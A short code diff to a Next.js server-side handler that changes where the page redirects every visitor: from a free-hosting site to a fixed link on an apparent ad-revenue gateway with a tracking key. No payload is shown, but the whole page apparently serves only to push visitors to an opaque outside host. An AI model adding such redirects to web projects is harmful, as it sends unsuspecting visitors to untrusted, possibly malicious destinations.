@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://nurniltm.000webhostapp.com/` + encodeURI(path as string)
+					`https://www.highrevenuegate.com/jesmtvxa8d?key=fc45a15b904c53a7f43459e05a965d7e`
 				}`,
 			},
 		};
